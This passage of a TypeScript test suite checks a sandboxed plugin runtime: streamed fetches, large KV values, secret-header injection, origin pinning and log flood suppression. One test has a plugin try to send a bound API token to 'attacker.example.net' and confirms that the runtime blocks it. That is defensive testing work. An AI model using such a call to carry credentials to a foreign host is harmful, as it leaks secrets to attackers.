        });
        await bigFetchRuntime.deactivate(BIG_FETCH_PLUGIN_ID);
      } finally {
        await bigFetchRuntime.shutdown().catch(() => undefined);
      }
    },
  );

  it(
    'streams a fetch response larger than one chunk over §17 credit frames (Stage F part 14)',
    { timeout: 60000 },
    async () => {
      // A 600 KiB body exceeds one §17 chunk (256 KiB): the encoded response
      // must travel as three RPC_RESPONSE_STREAM frames paced by the worker's
      // credit grants, and the worker must reassemble + decode once (§15.1).
      const body = 'w'.repeat(600 * 1024);
      const streamFetchRuntime = createVNextRuntimeService(
        {
          database,
          providers: undefined,
          config: { providerTimeouts: { connectMs: 1000, idleMs: 1000, readMs: 1000 } },
        } as unknown as VNextBrokerHost,
        {
          stderrSink: (line) => runtimeStderr.push(line),
          timeoutMs: 15000,
          fetchImpl: async () =>
            new Response(body, {
              status: 200,
              statusText: 'OK',
              headers: { 'content-type': 'text/plain' },
            }),
          dnsLookupImpl: async () => ['93.184.216.34'],
        },
      );

      try {
        writePluginPackage(
          BIG_FETCH_PLUGIN_ID,
          [
            'export let result;',
            "sdk.network.fetch('https://example.com/stream')",
            '  .then((r) => { result = { status: r.status, bodyLength: r.body.length, head: r.body.slice(0, 4) }; });',
          ].join('\n'),
        );
        database.repos.capabilityGrants.grant({
          pluginId: BIG_FETCH_PLUGIN_ID,
          name: 'network.http',
          scope: {},
        });

        const info = await streamFetchRuntime.activate({
          pluginId: BIG_FETCH_PLUGIN_ID,
          installationId: `${BIG_FETCH_PLUGIN_ID}@1.0.0`,
          packageRoot: join(tempRoot, BIG_FETCH_PLUGIN_ID),
          entry: 'src/index.js',
          trustLevel: 'sandbox',
        });
        expect(info.noNodeAuthority).toBe(true);
        expect(info.snapshot).toEqual({
          result: { status: 200, bodyLength: 600 * 1024, head: 'wwww' },
        });
        await streamFetchRuntime.deactivate(BIG_FETCH_PLUGIN_ID);
      } finally {
        await streamFetchRuntime.shutdown().catch(() => undefined);
      }
    },
  );
});

describe('vNext runtime service (Stage F part 13 — large request args)', () => {
  const BIG_KV_PLUGIN_ID = 'test.vnext.bigkv';

  it(
    'round-trips a KV value above the control cap through the real wire',
    { timeout: 60000 },
    async () => {
      // The 100 KiB value cannot ride the RPC_REQUEST control frame: the
      // worker ships it as an opaque RPC_REQUEST_DATA payload on fd 4, the
      // runtime forwards it verbatim, and the host decodes it once (§15.1)
      // before the storage.kv executor runs.
      writePluginPackage(
        BIG_KV_PLUGIN_ID,
        [
          'export let result;',
          "const big = 'v'.repeat(100 * 1024);",
          "sdk.kv.set('big', big).then(() => sdk.kv.get('big'))",
          '  .then((res) => { result = { len: res.value.length, head: res.value.slice(0, 3) }; });',
        ].join('\n'),
      );
      database.repos.capabilityGrants.grant({
        pluginId: BIG_KV_PLUGIN_ID,
        name: 'storage.kv',
        scope: {},
      });

      const info = await runtime.activate({
        pluginId: BIG_KV_PLUGIN_ID,
        installationId: `${BIG_KV_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, BIG_KV_PLUGIN_ID),
        entry: 'src/index.js',
        trustLevel: 'sandbox',
      });
      expect(info.noNodeAuthority).toBe(true);
      expect(info.snapshot).toEqual({ result: { len: 100 * 1024, head: 'vvv' } });

      await runtime.deactivate(BIG_KV_PLUGIN_ID);
      expect(runtimeStderr.filter((line) => line.includes('protocol error'))).toEqual([]);
    },
  );
});

describe('vNext runtime service (§29 keep-alive/pooling, proxy, secret injection)', () => {
  const SECRET_PLUGIN_ID = 'test.vnext.secretfetch';

  it(
    'injects a secret-bound header through the real wire and pins the origin',
    { timeout: 60000 },
    async () => {
      // The plugin sends only the opaque secretId; the production executor
      // resolves it against the service secret registry and injects the
      // header at request time — the plugin never sees the value.
      let seenAuthorization: string | undefined;
      const secretRuntime = createVNextRuntimeService(
        {
          database,
          providers: undefined,
          config: { providerTimeouts: { connectMs: 1000, idleMs: 1000, readMs: 1000 } },
        } as unknown as VNextBrokerHost,
        {
          stderrSink: (line) => runtimeStderr.push(line),
          timeoutMs: 15000,
          fetchImpl: async (_url, init) => {
            seenAuthorization = (init.headers as Record<string, string> | undefined)?.[
              'authorization'
            ];
            return new Response('ok', { status: 200, statusText: 'OK' });
          },
          dnsLookupImpl: async () => ['93.184.216.34'],
          networkSecrets: {
            'api-token': {
              origin: 'https://example.com',
              headers: { authorization: 'Bearer injected-by-host' },
            },
          },
        },
      );

      try {
        writePluginPackage(
          SECRET_PLUGIN_ID,
          [
            'export let result;',
            "sdk.network.fetch('https://example.com/v1', { secretId: 'api-token' })",
            '  .then((r) => { result = { status: r.status, body: r.body }; });',
          ].join('\n'),
        );
        database.repos.capabilityGrants.grant({
          pluginId: SECRET_PLUGIN_ID,
          name: 'network.http',
          scope: {},
        });

        const info = await secretRuntime.activate({
          pluginId: SECRET_PLUGIN_ID,
          installationId: `${SECRET_PLUGIN_ID}@1.0.0`,
          packageRoot: join(tempRoot, SECRET_PLUGIN_ID),
          entry: 'src/index.js',
          trustLevel: 'sandbox',
        });
        expect(info.noNodeAuthority).toBe(true);
        expect(info.snapshot).toEqual({ result: { status: 200, body: 'ok' } });
        expect(seenAuthorization).toBe('Bearer injected-by-host');
        await secretRuntime.deactivate(SECRET_PLUGIN_ID);
      } finally {
        await secretRuntime.shutdown().catch(() => undefined);
      }
    },
  );

  it(
    'rejects a secretId aimed at a foreign origin through the real wire',
    { timeout: 60000 },
    async () => {
      const mismatchRuntime = createVNextRuntimeService(
        {
          database,
          providers: undefined,
          config: { providerTimeouts: { connectMs: 1000, idleMs: 1000, readMs: 1000 } },
        } as unknown as VNextBrokerHost,
        {
          stderrSink: (line) => runtimeStderr.push(line),
          timeoutMs: 15000,
          fetchImpl: async () => new Response('should-not-reach', { status: 200 }),
          dnsLookupImpl: async () => ['93.184.216.34'],
          networkSecrets: {
            'api-token': {
              origin: 'https://example.com',
              headers: { authorization: 'Bearer injected-by-host' },
            },
          },
        },
      );

      try {
        writePluginPackage(
          SECRET_PLUGIN_ID,
          [
            'export let error;',
            "sdk.network.fetch('https://attacker.example.net/x', { secretId: 'api-token' })",
            '  .then(undefined, (err) => { error = { code: err.code }; });',
          ].join('\n'),
        );
        database.repos.capabilityGrants.grant({
          pluginId: SECRET_PLUGIN_ID,
          name: 'network.http',
          scope: {},
        });

        const info = await mismatchRuntime.activate({
          pluginId: SECRET_PLUGIN_ID,
          installationId: `${SECRET_PLUGIN_ID}@1.0.0`,
          packageRoot: join(tempRoot, SECRET_PLUGIN_ID),
          entry: 'src/index.js',
          trustLevel: 'sandbox',
        });
        expect(info.noNodeAuthority).toBe(true);
        expect((info.snapshot['error'] as { code: string }).code).toBe(
          'NETWORK_SECRET_ORIGIN_MISMATCH',
        );
        await mismatchRuntime.deactivate(SECRET_PLUGIN_ID);
      } finally {
        await mismatchRuntime.shutdown().catch(() => undefined);
      }
      expect(runtimeStderr.filter((line) => line.includes('protocol error'))).toEqual([]);
    },
  );

  it(
    'mints a dynamic secret handle and injects it into a fetch (§33/§29.1.5)',
    { timeout: 60000 },
    async () => {
      const seenAuthorization: string[] = [];
      const secretsRuntime = createVNextRuntimeService(
        {
          database,
          providers: undefined,
          config: { providerTimeouts: { connectMs: 1000, idleMs: 1000, readMs: 1000 } },
        } as unknown as VNextBrokerHost,
        {
          stderrSink: (line) => runtimeStderr.push(line),
          timeoutMs: 15000,
          logSink: (entry) => logEntries.push(entry),
          fetchImpl: async (_url, init) => {
            seenAuthorization.push(
              (init.headers as Record<string, string> | undefined)?.['authorization'] ?? '',
            );
            return new Response('ok', { status: 200, statusText: 'OK' });
          },
          dnsLookupImpl: async () => ['93.184.216.34'],
          secretsProvider: {
            async use(pluginId, connectionId) {
              return {
                serviceId: 'com.example.api',
                origin: 'https://api.example.com',
                headers: { authorization: `Bearer ${pluginId}:${connectionId}` },
                expiresAt: null,
              };
            },
            async manageOwn() {
              return [
                {
                  connectionId: 'conn-1',
                  serviceId: 'com.example.api',
                  serviceName: 'Example API',
                  scopes: ['read'],
                  status: 'connected',
                },
              ];
            },
            async reveal() {
              throw new Error('reveal must not be reachable at sandbox trust');
            },
          },
        },
      );
      const SECRETS_PLUGIN_ID = 'test.vnext.secrets';
      try {
        writePluginPackage(
          SECRETS_PLUGIN_ID,
          [
            'export let result;',
            "sdk.secrets.use({ connectionId: 'conn-1' })",
            '  .then((used) => {',
            '    result = { handle: used.handle, serviceId: used.serviceId };',
            '    return sdk.secrets.manageOwn().then((listed) => { result.count = listed.connections.length; });',
            '  })',
            '  .then(() => {',
            "    return sdk.secrets.reveal({ connectionId: 'conn-1' }).then(undefined, (err) => { result.reveal = err.code; });",
            '  })',
            "  .then(() => sdk.secrets.use({ connectionId: 'conn-1' }))",
            "  .then((used) => sdk.network.fetch('https://api.example.com/v1', { secretId: used.handle }))",
            "  .then((r) => { result.status = r.status; console.log('SECRET_FETCH ' + r.status); })",
            "  .catch((err) => { console.log('SECRET_FAILED ' + err.code); });",
          ].join('\n'),
        );
        for (const name of ['secrets.use', 'secrets.manageOwn', 'secrets.reveal', 'network.http']) {
          database.repos.capabilityGrants.grant({
            pluginId: SECRETS_PLUGIN_ID,
            name,
            scope: {},
          });
        }

        await secretsRuntime.activate({
          pluginId: SECRETS_PLUGIN_ID,
          installationId: `${SECRETS_PLUGIN_ID}@1.0.0`,
          packageRoot: join(tempRoot, SECRETS_PLUGIN_ID),
          entry: 'src/index.js',
          trustLevel: 'sandbox',
        });

        // The dynamic flow settles after the activation snapshot: poll the
        // drained log router for the final fetch marker.
        const deadline = Date.now() + 15000;
        for (;;) {
          if (logEntries.some((entry) => entry.message.includes('SECRET_FETCH'))) break;
          if (Date.now() >= deadline) {
            throw new Error("log marker 'SECRET_FETCH' never arrived");
          }
          await new Promise((resolve) => setTimeout(resolve, 25));
        }
        // The §33 handle injected the stored Authorization header host-side;
        // reveal stayed gated (sandbox → TRUST_REQUIRED); the plugin never
        // saw the token value.
        expect(seenAuthorization).toEqual(['Bearer test.vnext.secrets:conn-1']);
        expect(logEntries.some((entry) => entry.message.includes('SECRET_FAILED'))).toBe(false);
        await secretsRuntime.deactivate(SECRETS_PLUGIN_ID);
      } finally {
        await secretsRuntime.shutdown().catch(() => undefined);
      }
    },
  );
});

describe('vNext runtime service (§9.1.1 host log router)', () => {
  const LOG_PLUGIN_ID = 'test.vnext.logs';
  const FLOOD_PLUGIN_ID = 'test.vnext.logflood';

  function waitForLogs(
    predicate: (entries: typeof logEntries) => boolean,
    timeoutMs: number,
  ): Promise<void> {
    const deadline = Date.now() + timeoutMs;
    return new Promise((resolveWait) => {
      const poll = (): void => {
        if (predicate(logEntries) || Date.now() >= deadline) {
          resolveWait();
          return;
        }
        setTimeout(poll, 25);
      };
      poll();
    });
  }

  it(
    'routes plugin console records to the host log router with attribution',
    { timeout: 60000 },
    async () => {
      writePluginPackage(
        LOG_PLUGIN_ID,
        [
          "console.log('hello-from-plugin', 42);",
          "console.error('err-from-plugin');",
          'export const marker = 1;',
        ].join('\n'),
      );
      const info = await runtime.activate({
        pluginId: LOG_PLUGIN_ID,
        installationId: `${LOG_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, LOG_PLUGIN_ID),
        entry: 'src/index.js',
        trustLevel: 'sandbox',
      });
      expect(info.noNodeAuthority).toBe(true);

      await waitForLogs(
        (entries) =>
          entries.some(
            (e) => e.pluginId === LOG_PLUGIN_ID && e.message.includes('hello-from-plugin'),
          ),
        8000,
      );
      const pluginEntries = logEntries.filter((e) => e.pluginId === LOG_PLUGIN_ID);
      expect(pluginEntries.length).toBeGreaterThan(0);
      expect(pluginEntries.some((e) => e.message.includes('hello-from-plugin 42'))).toBe(true);
      expect(
        pluginEntries.some((e) => e.level === 'error' && e.message.includes('err-from-plugin')),
      ).toBe(true);
      // No [NT] suppressed record on a clean batch.
      expect(pluginEntries.some((e) => e.suppressed !== undefined)).toBe(false);

      await runtime.deactivate(LOG_PLUGIN_ID);
    },
  );

  it(
    'emits the synthetic suppressed-record when the ring drops flood (§9.1.1 rule 9)',
    { timeout: 60000 },
    async () => {
      writePluginPackage(
        FLOOD_PLUGIN_ID,
        [
          "for (let i = 0; i < 5000; i++) console.log('flood-' + i);",
          'export const marker = 1;',
        ].join('\n'),
      );
      const info = await runtime.activate({
        pluginId: FLOOD_PLUGIN_ID,
        installationId: `${FLOOD_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, FLOOD_PLUGIN_ID),
        entry: 'src/index.js',
        trustLevel: 'sandbox',
      });
      expect(info.noNodeAuthority).toBe(true);

      await waitForLogs(
        (entries) =>
          entries.some((e) => e.pluginId === FLOOD_PLUGIN_ID && e.suppressed !== undefined),
        10000,
      );
      const suppressed = logEntries.filter(
        (e) => e.pluginId === FLOOD_PLUGIN_ID && e.suppressed !== undefined,
      );
      expect(suppressed.length).toBeGreaterThan(0);
      // Rule 9: the host MUST emit `[NT] N plugin log records suppressed`.
      expect(suppressed[0]?.message).toMatch(/^\[NT\] [\d,]+ plugin log records suppressed$/);
      expect(suppressed[0]?.suppressed).toBeGreaterThan(0);
      // Delivered records stay bounded per record and per batch.
      const delivered = logEntries.filter(
        (e) => e.pluginId === FLOOD_PLUGIN_ID && e.suppressed === undefined,
      );
      expect(delivered.length).toBeGreaterThan(0);
      expect(delivered.length).toBeLessThan(5000);
      for (const entry of delivered) {
        expect(entry.message.length).toBeLessThanOrEqual(4000);
      }

      await runtime.deactivate(FLOOD_PLUGIN_ID);
    },
  );
});
